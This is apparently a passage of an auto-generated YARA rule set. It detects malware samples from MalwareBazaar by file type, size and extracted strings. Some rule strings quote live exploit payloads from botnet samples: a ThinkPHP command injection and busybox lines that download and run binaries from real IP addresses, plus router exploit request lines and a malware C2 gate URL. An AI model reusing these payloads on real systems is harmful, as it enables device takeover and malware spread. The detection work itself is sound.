        $s19 = "<Module>{6B137933-AA08-4F29-AF7F-CFBB1AAED1B1}"
        $s20 = "System.ComponentModel"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 857KB and
        all of them
}

rule Windows_bea78cbf3ffb7847e8780d12db07b647e3af5af304c4bcef95d9e73e310d47bd
{
    meta:
        description = "Auto ML: bea78cbf3ffb7847e8780d12db07b647e3af5af304c4bcef95d9e73e310d47bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "advapi32.dll"
        $s6 = "user32.dll"
        $s7 = "kernel32.dll"
        $s8 = "user32"
        $s9 = "OLEACC.DLL"
        $s10 = "kernel32"
        $s11 = "CryptCreateHash"
        $s12 = "CryptGetHashParam"
        $s13 = "ExitWindowsEx"
        $s14 = "GetCurrentProcess"
        $s15 = "OpenProcessToken"
        $s16 = "IsWindow"
        $s17 = "FindWindowExA"
        $s18 = "GetClassNameA"
        $s19 = "RegisterWindowMessageA"
        $s20 = "SendMessageTimeoutA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 936KB and
        all of them
}

rule Linux_beeeb0302fcd47e3a607cac174494ae538e6130680d2e76d09f7b0f376ec1bda
{
    meta:
        description = "Auto ML: beeeb0302fcd47e3a607cac174494ae538e6130680d2e76d09f7b0f376ec1bda"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 115KB and
        all of them
}

rule Windows_13b674ae0e3c7fceb57574b0b8fcd7060c4a1c553f841136d1c7d5bf09d1685e
{
    meta:
        description = "Auto ML: 13b674ae0e3c7fceb57574b0b8fcd7060c4a1c553f841136d1c7d5bf09d1685e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_bf1b72b0469fe09e9e544ec62774f07d6c568aadb8aecbdbefe8b35d8e586c55
{
    meta:
        description = "Auto ML: bf1b72b0469fe09e9e544ec62774f07d6c568aadb8aecbdbefe8b35d8e586c55"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "RegSetValueExW"
        $s8 = "RegCloseKey"
        $s9 = "RegDeleteValueW"
        $s10 = "RegDeleteKeyW"
        $s11 = "OpenProcessToken"
        $s12 = "SetFileSecurityW"
        $s13 = "RegOpenKeyExW"
        $s14 = "RegCreateKeyExW"
        $s15 = "ADVAPI32.dll"
        $s16 = "SHFileOperationW"
        $s17 = "SHGetFileInfoW"
        $s18 = "SHGetPathFromIDListW"
        $s19 = "ShellExecuteExW"
        $s20 = "SHGetSpecialFolderLocation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 653KB and
        all of them
}

rule Windows_bf35fe6ed1dbd9f9594695e2ca5bd3d5f5b2706461ddc8f29344849a03c74008
{
    meta:
        description = "Auto ML: bf35fe6ed1dbd9f9594695e2ca5bd3d5f5b2706461ddc8f29344849a03c74008"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 357KB and
        all of them
}

rule Linux_bfbfc3315e8cba29119839fbc46d44e55eadad78979b16fc6501fce1a458863e
{
    meta:
        description = "Auto ML: bfbfc3315e8cba29119839fbc46d44e55eadad78979b16fc6501fce1a458863e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 115KB and
        all of them
}

rule Windows_c0155a1de83ff4f2584bb2439c19ef0387633e85948c4b379696a5853177aeee
{
    meta:
        description = "Auto ML: c0155a1de83ff4f2584bb2439c19ef0387633e85948c4b379696a5853177aeee"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "KERNEL32.DLL"
        $s3 = "COMCTL32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "LoadLibraryA"
        $s9 = "GetProcAddress"
        $s10 = "DrawDibOpen"
        $s11 = "GetDC"
        $s12 = "SkinH_EL.dll"
        $s13 = "SkinH_GetColor"
        $s14 = "SkinH_SetAero"
        $s15 = "SkinH_SetBackColor"
        $s16 = "SkinH_SetFont"
        $s17 = "SkinH_SetFontEx"
        $s18 = "SkinH_SetForeColor"
        $s19 = "SkinH_SetMenuAlpha"
        $s20 = "SkinH_SetTitleMenuBar"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 263KB and
        all of them
}

rule Linux_c0566bccac1e2a5599971cef90b8279aa5c7e2a8d5e2e482165070c1065f3cca
{
    meta:
        description = "Auto ML: c0566bccac1e2a5599971cef90b8279aa5c7e2a8d5e2e482165070c1065f3cca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "%cgcmdly;p"
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s3 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB and
        all of them
}

rule Linux_c0a1bcc2ab96bb85f36ecd7da63eb8e4f7cccdb63babab11d0fe76084abecec6
{
    meta:
        description = "Auto ML: c0a1bcc2ab96bb85f36ecd7da63eb8e4f7cccdb63babab11d0fe76084abecec6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://141.98.10.85/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = "processor"
        $s10 = "/sys/devices/system/cpu"
        $s11 = ".text"
        $s12 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 86KB and
        all of them
}

rule Windows_c0bb486bdbe13bb82763950a923e16a697055bc6b7c5284bd8625d970732e7b0
{
    meta:
        description = "Auto ML: c0bb486bdbe13bb82763950a923e16a697055bc6b7c5284bd8625d970732e7b0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "_lread"
        $s6 = "ExitProcess"
        $s7 = "WinExec"
        $s8 = "GetCurrentProcess"
        $s9 = "GetVersionExA"
        $s10 = "OpenFile"
        $s11 = "GetProcAddress"
        $s12 = "LoadLibraryA"
        $s13 = "_lclose"
        $s14 = "_lopen"
        $s15 = "GetModuleFileNameA"
        $s16 = "GetModuleHandleA"
        $s17 = "GetCommandLineA"
        $s18 = "SetErrorMode"
        $s19 = "GetTempFileNameA"
        $s20 = "GetWindowsDirectoryA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 27145KB and
        all of them
}

rule Windows_c0da527625e48ff867196f7d0cb29117d5a8db42d7f802604fd20eaffa2b8f4d
{
    meta:
        description = "Auto ML: c0da527625e48ff867196f7d0cb29117d5a8db42d7f802604fd20eaffa2b8f4d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".data"
        $s2 = ".rsrc"
        $s3 = "- unable to open console device"
        $s4 = "- unexpected multithread lock error"
        $s5 = "- not enough space for thread data"
        $s6 = "- floating point not loaded"
        $s7 = "GetLastActivePopup"
        $s8 = "GetActiveWindow"
        $s9 = "user32.dll"
        $s10 = "GetProcAddress"
        $s11 = "GetModuleHandleA"
        $s12 = "KERNEL32.dll"
        $s13 = "GetStartupInfoA"
        $s14 = "GetCommandLineA"
        $s15 = "GetVersion"
        $s16 = "ExitProcess"
        $s17 = "TerminateProcess"
        $s18 = "GetCurrentProcess"
        $s19 = "GetModuleFileNameA"
        $s20 = "GetEnvironmentStrings"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 397KB and
        all of them
}

rule Windows_c0dddd2f76868a1b8d473e03031f663cef750cb51941841d1efc38c3962785ce
{
    meta:
        description = "Auto ML: c0dddd2f76868a1b8d473e03031f663cef750cb51941841d1efc38c3962785ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6293KB and
        all of them
}

rule Linux_c0e125c31b9883cf738858419269387bfadbc533abcdbc4188787c5501d62335
{
    meta:
        description = "Auto ML: c0e125c31b9883cf738858419269387bfadbc533abcdbc4188787c5501d62335"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/proc/%s/cmdline"
        $s2 = "systemd"
        $s3 = "http"
        $s4 = "(deleted)"
        $s5 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d"
        $s6 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d"
        $s7 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d"
        $s8 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d"
        $s9 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d"
        $s10 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d"
        $s11 = "/proc/self/cmdline"
        $s12 = "No such file or directory"
        $s13 = "No such process"
        $s14 = "Interrupted system call"
        $s15 = "Bad file descriptor"
        $s16 = "No child processes"
        $s17 = "Resource temporarily unavailable"
        $s18 = "File exists"
        $s19 = "Too many open files in system"
        $s20 = "Too many open files"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB and
        all of them
}

rule Windows_13e063bc39be5c694f3bb67deead2b8a4781d98a0c26cc2d8ec68e0a72726dc7
{
    meta:
        description = "Auto ML: 13e063bc39be5c694f3bb67deead2b8a4781d98a0c26cc2d8ec68e0a72726dc7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = ".text"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".rsrc"
        $s6 = "SetThreadPreferredUILanguages"
        $s7 = "kernel32"
        $s8 = "SetProcessPreferredUILanguages"
        $s9 = "GetNativeSystemInfo"
        $s10 = "Could not overwrite file \"%s\"."
        $s11 = "Could not create file \"%s\"."
        $s12 = "No \"HelpText\" in the configuration file."
        $s13 = "\"setup.exe\""
        $s14 = "Could not find \"setup.exe\"."
        $s15 = "Could not delete file or folder \"%s\"."
        $s16 = "Could not create folder \"%s\"."
        $s17 = "Could not write SFX configuration."
        $s18 = "Could not read SFX configuration or configuration not found."
        $s19 = "Could not open archive file \"%s\"."
        $s20 = "Could not get SFX filename."
    condition:
        uint32(0) == 0x00605a4d and
        filesize < 4050KB and
        all of them
}

rule Linux_c1046f2cfb6e4a7d2929fa7202c9b34cf58d355732c8d19d265dd2482e19219b
{
    meta:
        description = "Auto ML: c1046f2cfb6e4a7d2929fa7202c9b34cf58d355732c8d19d265dd2482e19219b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OpenSUSE"
        $s2 = "OpenWRT"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 68KB and
        all of them
}

rule Windows_c124a4946fe5082a00d6cac5473ec09163f6c1c0720e47293bf1f2e8b28d44f2
{
    meta:
        description = "Auto ML: c124a4946fe5082a00d6cac5473ec09163f6c1c0720e47293bf1f2e8b28d44f2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1993KB and
        all of them
}

rule Windows_c125c422c6534f72a342ec54231c2caaff61cb2f649bb764913ff76e25705d4c
{
    meta:
        description = "Auto ML: c125c422c6534f72a342ec54231c2caaff61cb2f649bb764913ff76e25705d4c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1210KB and
        all of them
}

rule Linux_c1282be20f20826fb62d1716fd91e50b1c1e5a0b1f94d6259818ab0713fbd499
{
    meta:
        description = "Auto ML: c1282be20f20826fb62d1716fd91e50b1c1e5a0b1f94d6259818ab0713fbd499"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = "processor"
        $s10 = "/sys/devices/system/cpu"
        $s11 = ".text"
        $s12 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 90KB and
        all of them
}

rule Linux_c1712b191d346860f71a7e2f0eee19aa3d7823e7c5c8502b0481b8e8146f55b5
{
    meta:
        description = "Auto ML: c1712b191d346860f71a7e2f0eee19aa3d7823e7c5c8502b0481b8e8146f55b5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 62KB and
        all of them
}

rule Windows_c177812f5ee5c7643659dba85dcdb7d86134d2a437a8c7934c9b63eb3a5b4530
{
    meta:
        description = "Auto ML: c177812f5ee5c7643659dba85dcdb7d86134d2a437a8c7934c9b63eb3a5b4530"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "4Data Source '{1}' already exists in the Scope '{0}'."
        $s6 = "FType system could not create wrapper class for design time attributes."
        $s7 = "\"Create Activity from Toolbox: {0}."
        $s8 = ")Showing types which derive from Activity."
        $s9 = "There is already a component named '{0}'.  Components must have unique names, and names must be case-insensitive.  A name also cannot conflict with the name of any component in an inherited class."
        $s10 = "Please specify an error message. The value in \"\" (quotes) will be treated as literal, otherwise it will be treated as the name of the variable of type System.String."
        $s11 = "zCompositeActivity cannot transition to 'Closed' status when there are active child context still exist for child activity."
        $s12 = "\\CompositeActivity cannot transition to 'Closed' status when there are active child activity."
        $s13 = "=Activity '{0}' is already a child of CompositeActivity '{1}'."
        $s14 = "<Cannot change the activity name.  Name '{0}' already exists."
        $s15 = "XPlease use Activity.Save()/Activity.Load() while serializing/deserializing the activity."
        $s16 = "Already registered as: {0}."
        $s17 = ":Please correct the following errors in specified binding:"
        $s18 = "BGetRuntimeValue failed since Path '{0}' evaluated to 'null' value."
        $s19 = "YCannot compile a markup file which does not contain declaration of the new workflow type."
        $s20 = "ZContext cannot be completed at this time, when associated ContextActivity is not 'Closed'."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1152KB and
        all of them
}

rule Windows_c1a7adbef8fb6d94955cbae7dd0dd5c2778eb4cb45e56b73ccc772274bcb55da
{
    meta:
        description = "Auto ML: c1a7adbef8fb6d94955cbae7dd0dd5c2778eb4cb45e56b73ccc772274bcb55da"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetWindowsVersion>g__HKLM_GetString|11_0"
        $s5 = "<GetScanArgs>b__5_0"
        $s6 = "Microsoft.Win32"
        $s7 = "<GetTokens>d__2"
        $s8 = "<Module>"
        $s9 = "System.Drawing.Drawing2D"
        $s10 = "get_ReleaseID"
        $s11 = "set_ReleaseID"
        $s12 = "get_TaskID"
        $s13 = "set_TaskID"
        $s14 = "get_ASCII"
        $s15 = "get_JSON"
        $s16 = "get_ScanVPN"
        $s17 = "set_ScanVPN"
        $s18 = "System.IO"
        $s19 = "get_BlockedIP"
        $s20 = "set_BlockedIP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 96KB and
        all of them
}

rule Windows_c1be3c17f856344daf7ab2ad08074e94145f371698f52bc93b5dde4030c53f62
{
    meta:
        description = "Auto ML: c1be3c17f856344daf7ab2ad08074e94145f371698f52bc93b5dde4030c53f62"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "More information: http://www.ibsensoftware.com/"
        $s5 = "http://mnpupdate.sytes.net/icrm/gate.php"
        $s6 = "YUIPWDFILE0YUIPKDFILE0YUICRYPTED0YUI1.0"
        $s7 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
        $s8 = "Software\\WinRAR"
        $s9 = "open"
        $s10 = "kernel32.dll"
        $s11 = "WTSGetActiveConsoleSessionId"
        $s12 = "ProcessIdToSessionId"
        $s13 = "netapi32.dll"
        $s14 = "NetUserEnum"
        $s15 = "StgOpenStorage"
        $s16 = "advapi32.dll"
        $s17 = "CryptGetUserKey"
        $s18 = "OpenProcessToken"
        $s19 = "ImpersonateLoggedOnUser"
        $s20 = "GetTokenInformation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 93KB and
        all of them
}

rule Linux_c21ccd8261803110629e535c9c193887c0f2aede33f22cd69b3d84b4b036bbb9
{
    meta:
        description = "Auto ML: c21ccd8261803110629e535c9c193887c0f2aede33f22cd69b3d84b4b036bbb9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Linux_c22955abd0961e17b9553bfe317f0d87ef909c953e3400532ee170fd9e1fdd08
{
    meta:
        description = "Auto ML: c22955abd0961e17b9553bfe317f0d87ef909c953e3400532ee170fd9e1fdd08"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
